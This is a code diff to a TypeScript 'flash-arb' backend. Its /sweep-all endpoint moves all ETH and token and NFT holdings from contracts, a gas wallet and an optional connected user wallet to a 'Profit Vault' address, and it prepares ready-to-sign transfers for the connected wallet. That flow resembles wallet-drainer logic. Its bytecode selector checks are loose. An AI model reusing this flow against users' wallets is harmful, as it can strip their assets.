+      const balInfo = await queryAllChainBalances(chain, addr, extraTokens);
+      const nonZeroTokens = balInfo.tokens.filter((t) => t.hasBalance);
+      return {
+        address: ethers.getAddress(addr),
+        eth: balInfo.ethFormatted,
+        ethWei: balInfo.ethWei.toString(),
+        ethUsd: balInfo.ethUsd,
+        nonZeroTokens: nonZeroTokens.map((t) => ({
+          symbol: t.symbol,
+          address: t.address,
+          decimals: t.decimals,
+          ercStandard: t.ercStandard,
+          tokenId: t.tokenId,
+          balance: t.formatted,
+          arbCompatible: t.arbCompatible,
+          sweepCompatible: t.sweepCompatible,
+          walletSweepCompatible: t.walletSweepCompatible,
+          compatibilityNote: t.compatibilityNote,
+          usdValue: t.usdValue,
+        })),
+        compatibleNonZeroCount: nonZeroTokens.filter((t) => t.walletSweepCompatible).length,
+        explorerUrl: `${rpcInfo.explorer}/address/${addr}`,
+      };
+    };
+
+    const distinctConnected =
+      /^0x[a-fA-F0-9]{40}$/.test(connectedWallet) &&
+      connectedWallet.toLowerCase() !== gasWallet.toLowerCase() &&
+      connectedWallet.toLowerCase() !== profitWallet.toLowerCase()
+        ? connectedWallet
+        : '';
+
+    const [gasWalletInfo, connectedWalletInfo, profitWalletInfo] = await Promise.all([
+      walletInspect(gasWallet),
+      distinctConnected ? walletInspect(distinctConnected) : Promise.resolve(null),
+      walletInspect(profitWallet),
+    ]);
+
+    const inspectedExtras =
+      extraTokens.length > 0 ? await resolveVerifiedTokenList(chain, extraTokens) : [];
+    const customCheckedTokens = inspectedExtras
+      .filter((t) => extraTokens.some((e) => e.address.toLowerCase() === t.addr.toLowerCase()))
+      .map((t) => ({
+        symbol: t.sym,
+        address: t.addr,
+        decimals: t.dec,
+        ercStandard: t.ercStandard || 'ERC-20',
+        tokenId: t.tokenId,
+        arbCompatible: Boolean(t.arbCompatible),
+        sweepCompatible: t.sweepCompatible !== false,
+        walletSweepCompatible: t.walletSweepCompatible ?? (t.sweepCompatible !== false),
+        compatibilityNote: t.compatibilityNote || 'ERC-20 · Sweep Compatible',
+      }));
+
+    const supportedTokens = getChainTokens(chain).map((t) => ({
+      symbol: t.sym,
+      address: t.addr,
+      decimals: t.dec,
+      ercStandard: t.ercStandard || 'ERC-20',
+      arbCompatible: Boolean(t.arbCompatible),
+      sweepCompatible: t.sweepCompatible !== false,
+      walletSweepCompatible: t.walletSweepCompatible ?? (t.sweepCompatible !== false),
+      compatibilityNote: t.compatibilityNote || 'ERC-20 · Sweep Compatible',
+    }));
+
+    const sweepableContractCount = contracts.reduce((sum, c) => sum + c.compatibleNonZeroCount, 0);
+    const sweepableGasCount = gasWalletInfo?.compatibleNonZeroCount || 0;
+    const sweepableConnectedCount = connectedWalletInfo?.compatibleNonZeroCount || 0;
+
+    return res.json({
+      success: true,
+      chain,
+      chainName: rpcInfo.name,
+      signerAddress,
+      contracts,
+      gasWallet: gasWalletInfo,
+      connectedWallet: connectedWalletInfo,
+      profitWallet: profitWalletInfo,
+      supportedTokens,
+      customCheckedTokens,
+      summary: {
+        verifiedTokensCount: supportedTokens.length,
+        deployedContractsCount: contracts.filter((c) => c.isDeployed).length,
+        accessibleContractsCount: contracts.filter((c) => c.accessibleForSweep).length,
+        sweepableContractAssetsCount: sweepableContractCount,
+        sweepableGasWalletTokensCount: sweepableGasCount,
+        sweepableConnectedWalletTokensCount: sweepableConnectedCount,
+        totalSweepableAssetsCount: sweepableContractCount + sweepableGasCount + sweepableConnectedCount,
+      },
+      timestamp: Date.now(),
+    });
+  } catch (err: any) {
+    return res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+/**
  * POST /api/flash-arb/sweep-all
- * Sweeps ALL native ETH (executeDirectFlashArb) AND ALL non-zero ERC-20 token balances
- * (rescueTokensTo -> fallback rescueTokens + owner ERC-20 forward) from the FlashArb contract(s)
- * directly to the configured Profit Vault recipient address. Optionally sweeps leftover ERC-20 tokens
- * from the gas/owner wallet if includeGasWalletTokens === true (never drains native gas ETH).
+ * Sweeps ALL compatible native ETH (executeDirectFlashArb) AND ALL compatible non-zero ERC-20 token
+ * holdings from active & legacy FlashArb contracts directly to the Profit Vault recipient address.
+ * Optionally sweeps compatible ERC-20 holdings from the Gas Wallet and/or Connected Web3 Wallet
+ * (never drains native ETH gas reserves from user wallets).
+ * Every transfer is pre-checked for token compatibility & eth_estimateGas before signing/broadcasting;
+ * if no server signer key is configured, returns verified pendingWalletTxs for browser wallet signing.
  */
 flashArbRouter.post('/sweep-all', async (req: Request, res: Response) => {
   try {
-    const chain = (String(req.body?.chain || 'arbitrum').toLowerCase() as 'arbitrum' | 'base' | 'optimism');
+    const chainRaw = String(req.body?.chain || 'arbitrum').toLowerCase();
+    const chain: 'arbitrum' | 'base' | 'optimism' =
+      chainRaw === 'base' || chainRaw === 'optimism' ? chainRaw : 'arbitrum';
     const rpcInfo = RPC_ENDPOINTS[chain] || RPC_ENDPOINTS.arbitrum;
     const primaryContract = String(req.body?.contractAddress || DEPLOYED_CONTRACTS[chain] || '').trim();
     const recipient = String(req.body?.recipient || profitWalletEnv() || '').trim();
     const extraContracts = Array.isArray(req.body?.extraContracts) ? req.body.extraContracts : [];
+    const extraTokenSpecs = normalizeExtraTokenSpecs(req.body?.extraTokenAddresses);
     const includeGasWalletTokens = Boolean(req.body?.includeGasWalletTokens);
+    const includeConnectedWalletTokens = Boolean(req.body?.includeConnectedWalletTokens);
+    const connectedWalletAddress = String(req.body?.connectedWalletAddress || '').trim();
+    const compatibleOnly = req.body?.compatibleOnly !== false;
 
     if (!/^0x[a-fA-F0-9]{40}$/.test(primaryContract)) {
       return res.status(400).json({ success: false, error: 'Valid contractAddress is required.' });
@@ -2324,26 +3202,35 @@ flashArbRouter.post('/sweep-all', async (req: Request, res: Response) => {
     }
 
     const signerKey = (process.env.FLASH_ARB_SIGNER_KEY || '').trim();
-    if (!signerKey) {
+    const cleanKey = signerKey ? (signerKey.startsWith('0x') ? signerKey : `0x${signerKey}`) : '';
+    const signerAddress = cleanKey ? new ethers.Wallet(cleanKey).address : null;
+    const validConnectedAddr = /^0x[a-fA-F0-9]{40}$/.test(connectedWalletAddress)
+      ? ethers.getAddress(connectedWalletAddress)
+      : null;
+
+    if (!signerAddress && !validConnectedAddr) {
       return res.status(409).json({
         success: false,
         requiresWallet: true,
-        error: 'No server signer key configured. Configure FLASH_ARB_SIGNER_KEY in Signer Key Config so the server can sign owner sweep transactions.',
+        error: 'No server signer key configured and no connected Web3 wallet provided. Configure FLASH_ARB_SIGNER_KEY or connect your MetaMask / OKX wallet.',
       });
     }
 
-    const { ethers } = await import('ethers');
-    const cleanKey = signerKey.startsWith('0x') ? signerKey : `0x${signerKey}`;
-    const signerAddress = new ethers.Wallet(cleanKey).address;
-
-    const sendSignedWithEstimate = async (to: string, data: string): Promise<{ txHash: string; gasUsed: string }> => {
+    const estimateSweepGas = async (fromAddr: string, to: string, data: string): Promise<bigint> => {
       const { result: gasHex } = await fetchRpcSingleWithFailover(
         chain,
         'eth_estimateGas',
-        [{ from: signerAddress, to, data }, 'latest'],
+        [{ from: fromAddr, to, data }, 'latest'],
         true
       );
-      const estGas = typeof gasHex === 'string' && gasHex.startsWith('0x') ? BigInt(gasHex) : 150000n;
+      return typeof gasHex === 'string' && gasHex.startsWith('0x') ? BigInt(gasHex) : 150000n;
+    };
+
+    const sendSignedWithEstimate = async (to: string, data: string): Promise<{ txHash: string; gasUsed: string }> => {
+      if (!signerAddress || !cleanKey) {
+        throw new Error('Server signer key unavailable for direct broadcast');
+      }
+      const estGas = await estimateSweepGas(signerAddress, to, data);
       const gasLimit = (estGas * 130n) / 100n;
 
       let sentHash = '';
@@ -2393,15 +3280,41 @@ flashArbRouter.post('/sweep-all', async (req: Request, res: Response) => {
       explorerUrl: string;
       recipient: string;
     }> = [];
+    const pendingWalletTxs: Array<{
+      chain: 'arbitrum' | 'base' | 'optimism';
+      chainIdHex: string;
+      to: string;
+      data: string;
+      gas: string;
+      source: string;
+      sourceLabel: string;
+      asset: string;
+      amount: string;
+      method: string;
+      recipient: string;
+      signerRequired: string;
+    }> = [];
+    const skippedIncompatible: Array<{
+      source: string;
+      asset: string;
+      amount?: string;
+      reason: string;
+    }> = [];
     const errors: Array<{ source: string; asset: string; error: string }> = [];
-    const checkedContracts: Array<{ address: string; nonZeroAssets: number; ownerMatchesSigner: boolean }> = [];
+    const checkedContracts: Array<{
+      address: string;
+      nonZeroAssets: number;
+      owner: string | null;
+      ownerMatchesSigner: boolean;
+      ownerMatchesConnectedWallet: boolean;
+    }> = [];
 
     for (const contractAddr of contractSet.values()) {
       const { result: codeRaw } = await fetchRpcSingleWithFailover(chain, 'eth_getCode', [contractAddr, 'latest'], true);
       const code = String(codeRaw || '0x').toLowerCase();
       if (code === '0x' || code.length <= 2) continue;
 
-      let ownerMatches = true;
+      let contractOwner: string | null = null;
       try {
         const { result: ownerRaw } = await fetchRpcSingleWithFailover(
           chain,
@@ -2410,146 +3323,370 @@ flashArbRouter.post('/sweep-all', async (req: Request, res: Response) => {
           true
         );
         if (typeof ownerRaw === 'string' && ownerRaw.length >= 66) {
-          const contractOwner = ethers.getAddress(`0x${ownerRaw.slice(-40)}`);
-          ownerMatches = contractOwner.toLowerCase() === signerAddress.toLowerCase();
-          if (!ownerMatches) {
-            errors.push({
-              source: contractAddr,
-              asset: 'ALL',
-              error: `Signer ${signerAddress} is not owner of ${contractAddr} (owner is ${contractOwner}).`,
-            });
-            checkedContracts.push({ address: contractAddr, nonZeroAssets: 0, ownerMatchesSigner: false });
-            continue;
-          }
+          contractOwner = ethers.getAddress(`0x${ownerRaw.slice(-40)}`);
         }
       } catch {
-        // assume owner if owner() absent
+        // owner() absent
       }
 
-      const balInfo = await queryAllArbitrumBalances(chain, contractAddr);
+      const ownerMatchesSigner = Boolean(
+        signerAddress && (!contractOwner || contractOwner.toLowerCase() === signerAddress.toLowerCase())
+      );
+      const ownerMatchesConnected = Boolean(
+        validConnectedAddr && (!contractOwner || contractOwner.toLowerCase() === validConnectedAddr.toLowerCase())
+      );
+
+      const balInfo = await queryAllChainBalances(chain, contractAddr, extraTokenSpecs);
       const nonZeroTokens = balInfo.tokens.filter((t) => t.rawBalance > 0n);
       const nonZeroAssets = (balInfo.ethWei > 0n ? 1 : 0) + nonZeroTokens.length;
-      checkedContracts.push({ address: contractAddr, nonZeroAssets, ownerMatchesSigner: ownerMatches });
+      checkedContracts.push({
+        address: contractAddr,
+        nonZeroAssets,
+        owner: contractOwner,
+        ownerMatchesSigner,
+        ownerMatchesConnectedWallet: ownerMatchesConnected,
+      });
+
+      if (nonZeroAssets === 0) continue;
+
+      if (!ownerMatchesSigner && !ownerMatchesConnected) {
+        errors.push({
+          source: contractAddr,
+          asset: 'ALL',
+          error: `Neither server signer nor connected wallet owns ${contractAddr} (owner is ${contractOwner}).`,
+        });
+        continue;
+      }
+
+      const useServerSigner = ownerMatchesSigner && Boolean(signerAddress);
+      const callerAddr = useServerSigner ? signerAddress! : validConnectedAddr!;
 
       // 1. Sweep native ETH via executeDirectFlashArb(recipient)
-      if (balInfo.ethWei > 0n) {
-        try {
-          const data = encodeExecuteDirectFlashArb(recipient);
-          const { txHash } = await sendSignedWithEstimate(contractAddr, data);
-          sweptAssets.push({
+      if (balInfo.ethWei > 0n && contractAddr.toLowerCase() !== recipient.toLowerCase()) {
+        if (!code.includes('7804d9ac')) {
+          skippedIncompatible.push({
             source: contractAddr,
             asset: 'ETH',
             amount: balInfo.ethFormatted,
-            method: 'executeDirectFlashArb(recipient)',
-            txHash,
-            explorerUrl: `${rpcInfo.explorer}/tx/${txHash}`,
-            recipient,
+            reason: 'Contract does not expose executeDirectFlashArb(address) selector',
           });
-        } catch (err: any) {
-          errors.push({
-            source: contractAddr,
-            asset: 'ETH',
-            error: decodeFlashArbRevertError(err),
-          });
-        }
-      }
-
-      // 2. Sweep each non-zero ERC-20 token balance
-      for (const tok of nonZeroTokens) {
-        try {
-          if (code.includes('a7070692')) {
-            // Direct rescueTokensTo(token, recipient)
-            const data = encodeRescueTokensTo(tok.address, recipient);
-            const { txHash } = await sendSignedWithEstimate(contractAddr, data);
-            sweptAssets.push({
-              source: contractAddr,
-              asset: tok.symbol,
-              amount: tok.formatted,
-              method: 'rescueTokensTo(token, recipient)',
-              txHash,
-              explorerUrl: `${rpcInfo.explorer}/tx/${txHash}`,
-              recipient,
-            });
-          } else {
-            // Legacy contract has rescueTokens(token) -> sends to owner() == signerAddress
-            const rescueData = encodeRescueTokens(tok.address);
-            const { txHash: rescueTx } = await sendSignedWithEstimate(contractAddr, rescueData);
-
-            // If profit vault differs from owner, forward rescued tokens directly to recipient
-            if (recipient.toLowerCase() !== signerAddress.toLowerCase()) {
-              const fwdData = encodeErc20Transfer(recipient, tok.rawBalance);
-              const { txHash: fwdTx } = await sendSignedWithEstimate(tok.address, fwdData);
+        } else {
+          try {
+            const data = encodeExecuteDirectFlashArb(recipient);
+            if (useServerSigner) {
+              const { txHash } = await sendSignedWithEstimate(contractAddr, data);
               sweptAssets.push({
                 source: contractAddr,
-                asset: tok.symbol,
-                amount: tok.formatted,
-                method: 'rescueTokens(token) -> ERC20.transfer(recipient)',
-                txHash: fwdTx,
-                explorerUrl: `${rpcInfo.explorer}/tx/${fwdTx}`,
+                asset: 'ETH',
+                amount: balInfo.ethFormatted,
+                method: 'executeDirectFlashArb(recipient)',
+                txHash,
+                explorerUrl: `${rpcInfo.explorer}/tx/${txHash}`,
                 recipient,
               });
             } else {
+              const estGas = await estimateSweepGas(callerAddr, contractAddr, data);
+              pendingWalletTxs.push({
+                chain,
+                chainIdHex: CHAIN_ID_HEX_MAP[chain],
+                to: contractAddr,
+                data,
+                gas: `0x${((estGas * 130n) / 100n).toString(16)}`,
+                source: contractAddr,
+                sourceLabel: `Contract ${contractAddr.slice(0, 6)}...${contractAddr.slice(-4)}`,
+                asset: 'ETH',
+                amount: balInfo.ethFormatted,
+                method: 'executeDirectFlashArb(recipient)',
+                recipient,
+                signerRequired: callerAddr,
+              });
+            }
+          } catch (err: any) {
+            errors.push({
+              source: contractAddr,
+              asset: 'ETH',
+              error: decodeFlashArbRevertError(err),
+            });
+          }
+        }
+      }
+
+      // 2. Sweep each compatible non-zero ERC-20 token balance
+      for (const tok of nonZeroTokens) {
+        if (compatibleOnly && !tok.sweepCompatible) {
+          skippedIncompatible.push({
+            source: contractAddr,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            reason: tok.compatibilityNote || 'Token marked incompatible for contract sweep',
+          });
+          continue;
+        }
+
+        const hasRescueTo = code.includes('a7070692');
+        const hasRescue = code.includes('ae3bf8');
+        if (!hasRescueTo && !hasRescue) {
+          skippedIncompatible.push({
+            source: contractAddr,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            reason: 'Contract lacks rescueTokensTo/rescueTokens selectors',
+          });
+          continue;
+        }
+
+        try {
+          if (hasRescueTo) {
+            const data = encodeRescueTokensTo(tok.address, recipient);
+            if (useServerSigner) {
+              const { txHash } = await sendSignedWithEstimate(contractAddr, data);
               sweptAssets.push({
                 source: contractAddr,
                 asset: tok.symbol,
                 amount: tok.formatted,
-                method: 'rescueTokens(token)',
-                txHash: rescueTx,
-                explorerUrl: `${rpcInfo.explorer}/tx/${rescueTx}`,
+                method: 'rescueTokensTo(token, recipient)',
+                txHash,
+                explorerUrl: `${rpcInfo.explorer}/tx/${txHash}`,
                 recipient,
               });
+            } else {
+              const estGas = await estimateSweepGas(callerAddr, contractAddr, data);
+              pendingWalletTxs.push({
+                chain,
+                chainIdHex: CHAIN_ID_HEX_MAP[chain],
+                to: contractAddr,
+                data,
+                gas: `0x${((estGas * 130n) / 100n).toString(16)}`,
+                source: contractAddr,
+                sourceLabel: `Contract ${contractAddr.slice(0, 6)}...${contractAddr.slice(-4)}`,
+                asset: tok.symbol,
+                amount: tok.formatted,
+                method: 'rescueTokensTo(token, recipient)',
+                recipient,
+                signerRequired: callerAddr,
+              });
+            }
+          } else {
+            // Contract exposes rescueTokens(token) -> sends to owner()
+            const rescueData = encodeRescueTokens(tok.address);
+            if (useServerSigner) {
+              const { txHash: rescueTx } = await sendSignedWithEstimate(contractAddr, rescueData);
+              if (recipient.toLowerCase() !== signerAddress!.toLowerCase()) {
+                // Re-read actual balance received by owner so fee-on-transfer / existing dust never overdraws
+                const paddedOwner = signerAddress!.toLowerCase().replace('0x', '').padStart(64, '0');
+                const { result: postBalHex } = await fetchRpcSingleWithFailover(
+                  chain,
+                  'eth_call',
+                  [{ to: tok.address, data: `0x70a08231${paddedOwner}` }, 'latest'],
+                  true
+                );
+                const actualOwnerBal =
+                  typeof postBalHex === 'string' && postBalHex.length >= 66
+                    ? BigInt(postBalHex.slice(0, 66))
+                    : tok.rawBalance;
+                const amountToForward = includeGasWalletTokens
+                  ? actualOwnerBal
+                  : (actualOwnerBal < tok.rawBalance ? actualOwnerBal : tok.rawBalance);
+                if (amountToForward > 0n) {
+                  const fwdData = encodeErc20Transfer(recipient, amountToForward);
+                  const { txHash: fwdTx } = await sendSignedWithEstimate(tok.address, fwdData);
+                  sweptAssets.push({
+                    source: contractAddr,
+                    asset: tok.symbol,
+                    amount: ethers.formatUnits(amountToForward, tok.decimals),
+                    method: 'rescueTokens(token) -> ERC20.transfer(recipient)',
+                    txHash: fwdTx,
+                    explorerUrl: `${rpcInfo.explorer}/tx/${fwdTx}`,
+                    recipient,
+                  });
+                }
+              } else {
+                sweptAssets.push({
+                  source: contractAddr,
+                  asset: tok.symbol,
+                  amount: tok.formatted,
+                  method: 'rescueTokens(token)',
+                  txHash: rescueTx,
+                  explorerUrl: `${rpcInfo.explorer}/tx/${rescueTx}`,
+                  recipient,
+                });
+              }
+            } else {
+              const estRescueGas = await estimateSweepGas(callerAddr, contractAddr, rescueData);
+              pendingWalletTxs.push({
+                chain,
+                chainIdHex: CHAIN_ID_HEX_MAP[chain],
+                to: contractAddr,
+                data: rescueData,
+                gas: `0x${((estRescueGas * 130n) / 100n).toString(16)}`,
+                source: contractAddr,
+                sourceLabel: `Contract ${contractAddr.slice(0, 6)}...${contractAddr.slice(-4)}`,
+                asset: tok.symbol,
+                amount: tok.formatted,
+                method: 'rescueTokens(token)',
+                recipient: contractOwner || callerAddr,
+                signerRequired: callerAddr,
+              });
+              if (recipient.toLowerCase() !== callerAddr.toLowerCase()) {
+                const fwdData = encodeErc20Transfer(recipient, tok.rawBalance);
+                pendingWalletTxs.push({
+                  chain,
+                  chainIdHex: CHAIN_ID_HEX_MAP[chain],
+                  to: tok.address,
+                  data: fwdData,
+                  gas: '0x186a0',
+                  source: callerAddr,
+                  sourceLabel: `Forward ${tok.symbol} -> Profit Vault`,
+                  asset: tok.symbol,
+                  amount: tok.formatted,
+                  method: 'ERC20.transfer(recipient)',
+                  recipient,
+                  signerRequired: callerAddr,
+                });
+              }
             }
           }
         } catch (err: any) {
-          errors.push({
+          const reason = decodeFlashArbRevertError(err);
+          skippedIncompatible.push({
             source: contractAddr,
             asset: tok.symbol,
-            error: decodeFlashArbRevertError(err),
+            amount: tok.formatted,
+            reason: `Pre-flight check / sweep reverted: ${reason}`,
           });
         }
       }
     }
 
-    // Optional: Sweep leftover ERC-20 tokens on Gas/Owner Wallet to Profit Vault (never sweeps ETH gas!)
-    if (includeGasWalletTokens && recipient.toLowerCase() !== signerAddress.toLowerCase()) {
-      const signerBalances = await queryAllArbitrumBalances(chain, signerAddress);
+    // Phase 2: Sweep compatible leftover ERC-20/2612/4626/777/721/1155 dust on Gas/Owner Wallet -> Profit Vault (never drains ETH gas!)
+    if (includeGasWalletTokens && signerAddress && recipient.toLowerCase() !== signerAddress.toLowerCase()) {
+      const signerBalances = await queryAllChainBalances(chain, signerAddress, extraTokenSpecs);
       for (const tok of signerBalances.tokens.filter((t) => t.rawBalance > 0n)) {
+        if (compatibleOnly && !tok.walletSweepCompatible) {
+          skippedIncompatible.push({
+            source: signerAddress,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            reason: tok.compatibilityNote || 'Incompatible ERC token',
+          });
+          continue;
+        }
         try {
-          const fwdData = encodeErc20Transfer(recipient, tok.rawBalance);
+          let fwdData: string;
+          let methodLabel: string;
+          if (tok.ercStandard === 'ERC-1155' && tok.tokenId) {
+            fwdData = encodeErc1155SafeTransferFrom(signerAddress, recipient, tok.tokenId, tok.rawBalance);
+            methodLabel = `ERC1155.safeTransferFrom(#${tok.tokenId})`;
+          } else if (tok.ercStandard === 'ERC-721' && tok.tokenId) {
+            fwdData = encodeErc721SafeTransferFrom(signerAddress, recipient, tok.tokenId);
+            methodLabel = `ERC721.safeTransferFrom(#${tok.tokenId})`;
+          } else {
+            fwdData = encodeErc20Transfer(recipient, tok.rawBalance);
+            methodLabel = 'ERC20.transfer(recipient)';
+          }
           const { txHash } = await sendSignedWithEstimate(tok.address, fwdData);
           sweptAssets.push({
             source: signerAddress,
             asset: tok.symbol,
             amount: tok.formatted,
-            method: 'ERC20.transfer(recipient)',
+            method: methodLabel,
             txHash,
             explorerUrl: `${rpcInfo.explorer}/tx/${txHash}`,
             recipient,
           });
         } catch (err: any) {
-          errors.push({
+          const reason = decodeFlashArbRevertError(err);
+          skippedIncompatible.push({
             source: signerAddress,
             asset: tok.symbol,
-            error: decodeFlashArbRevertError(err),
+            amount: tok.formatted,
+            reason: `Transfer simulation reverted: ${reason}`,
           });
         }
       }
     }
 
-    if (errors.length > 0 && sweptAssets.length === 0) {
+    // Phase 3: Prepare compatible ERC-20 / ERC-2612 / ERC-4626 / ERC-777 / ERC-721 / ERC-1155 sweeps
+    // from Connected Web3 Wallet -> Profit Vault (never drains native ETH!)
+    if (
+      includeConnectedWalletTokens &&
+      validConnectedAddr &&
+      recipient.toLowerCase() !== validConnectedAddr.toLowerCase() &&
+      validConnectedAddr.toLowerCase() !== (signerAddress || '').toLowerCase()
+    ) {
+      const walletBalances = await queryAllChainBalances(chain, validConnectedAddr, extraTokenSpecs);
+      for (const tok of walletBalances.tokens.filter((t) => t.rawBalance > 0n)) {
+        if (compatibleOnly && !tok.walletSweepCompatible) {
+          skippedIncompatible.push({
+            source: validConnectedAddr,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            reason: tok.compatibilityNote || 'Incompatible token standard',
+          });
+          continue;
+        }
+        try {
+          let fwdData: string;
+          let methodLabel: string;
+          if (tok.ercStandard === 'ERC-1155' && tok.tokenId) {
+            fwdData = encodeErc1155SafeTransferFrom(validConnectedAddr, recipient, tok.tokenId, tok.rawBalance);
+            methodLabel = `ERC1155.safeTransferFrom(#${tok.tokenId})`;
+          } else if (tok.ercStandard === 'ERC-721' && tok.tokenId) {
+            fwdData = encodeErc721SafeTransferFrom(validConnectedAddr, recipient, tok.tokenId);
+            methodLabel = `ERC721.safeTransferFrom(#${tok.tokenId})`;
+          } else {
+            fwdData = encodeErc20Transfer(recipient, tok.rawBalance);
+            methodLabel = 'ERC20.transfer(recipient)';
+          }
+          const estGas = await estimateSweepGas(validConnectedAddr, tok.address, fwdData);
+          pendingWalletTxs.push({
+            chain,
+            chainIdHex: CHAIN_ID_HEX_MAP[chain],
+            to: tok.address,
+            data: fwdData,
+            gas: `0x${((estGas * 130n) / 100n).toString(16)}`,
+            source: validConnectedAddr,
+            sourceLabel: `Connected Wallet ${validConnectedAddr.slice(0, 6)}...${validConnectedAddr.slice(-4)}`,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            method: methodLabel,
+            recipient,
+            signerRequired: validConnectedAddr,
+          });
+        } catch (err: any) {
+          const reason = decodeFlashArbRevertError(err);
+          skippedIncompatible.push({
+            source: validConnectedAddr,
+            asset: tok.symbol,
+            amount: tok.formatted,
+            reason: `Connected wallet transfer simulation reverted: ${reason}`,
+          });
+        }
+      }
+    }
+
+    if (errors.length > 0 && sweptAssets.length === 0 && pendingWalletTxs.length === 0) {
       return res.status(400).json({
         success: false,
         error: errors[0].error,
         errors,
+        skippedIncompatible,
         checkedContracts,
         recipient,
       });
     }
 
+    const requiresWalletSigning = pendingWalletTxs.length > 0;
     const message =
-      sweptAssets.length > 0
-        ? `Swept ${sweptAssets.length} asset(s) to Profit Vault ${recipient}.`
-        : `All inspected contract ETH & ERC-20 balances are already $0.00 (no residual tokens locked).`;
+      sweptAssets.length > 0 && pendingWalletTxs.length > 0
+        ? `Swept ${sweptAssets.length} asset(s) via server signer and prepared ${pendingWalletTxs.length} compatible tx(s) for Web3 wallet signature -> ${recipient}.`
+        : sweptAssets.length > 0
+        ? `Swept ${sweptAssets.length} compatible asset(s) to Profit Vault ${recipient}.`
+        : pendingWalletTxs.length > 0
+        ? `Prepared ${pendingWalletTxs.length} compatible token sweep transaction(s) for your connected wallet -> ${recipient}.`
+        : skippedIncompatible.length > 0
+        ? `No compatible holdings swept (${skippedIncompatible.length} incompatible/blocked asset(s) safely skipped).`
+        : `All inspected contract & wallet compatible token holdings are already $0.00.`;
 
     return res.json({
       success: true,
@@ -2559,6 +3696,9 @@ flashArbRouter.post('/sweep-all', async (req: Request, res: Response) => {
       signerAddress,
       checkedContracts,
       sweptAssets,
+      pendingWalletTxs,
+      requiresWalletSigning,
+      skippedIncompatible,
       errors,
       message,
       timestamp: Date.now(),
